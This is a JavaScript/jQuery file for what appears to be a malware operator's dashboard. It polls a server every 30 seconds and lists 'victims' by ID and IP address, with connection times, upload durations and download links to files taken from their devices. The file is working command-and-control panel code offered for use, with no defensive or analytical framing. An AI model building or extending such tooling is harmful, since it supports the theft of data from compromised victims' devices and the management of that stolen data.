$(document).ready(function() {
  // Function to fetch data from the server and update the dashboard
  function fetchData() {
    $.ajax({
      url: '/dashboard-data',
      method: 'GET',
      success: function(data) {
        const tbody = $('#devicesTable tbody');
        tbody.empty(); // Clear existing rows

        for (const [victimId, device] of Object.entries(data)) {
          const fileListId = `file-list-${victimId}`;
          const fileListHtml = device.fileList.map(file => `
            <li>
              <a href="/download/${victimId}/${file}" download>${file}</a>
            </li>
          `).join('');

          // Display time taken to receive all files
          const timeToReceiveAllFiles = device.totalUploadTime ? `${(device.totalUploadTime / 1000).toFixed(2)} seconds` : 'N/A';

          const row = $(`
            <tr>
              <td>${victimId}</td>
              <td>${device.ip}</td>
              <td>${new Date(device.connectionTime).toLocaleString()}</td>
              <td>${new Date(device.lastConnectionTime).toLocaleString()}</td>
              <td>${timeToReceiveAllFiles}</td> <!-- New column -->
              <td>
                <button class="toggle-btn" onclick="toggleFiles('${victimId}')">Show Files</button>
                <ul id="${fileListId}" class="file-list hidden">
                  ${fileListHtml}
                </ul>
              </td>
            </tr>
          `);
          tbody.append(row);
        }
      },
      error: function(err) {
        console.error('Error fetching dashboard data:', err);
      }
    });
  }

  // Function to toggle file list visibility
  window.toggleFiles = function(victimId) {
    const fileList = $(`#file-list-${victimId}`);
    fileList.toggleClass('hidden');
  };

  // Fetch data every 30 seconds to keep the dashboard updated
  setInterval(fetchData, 30000);

  // Fetch data immediately when the page loads
  fetchData();
});
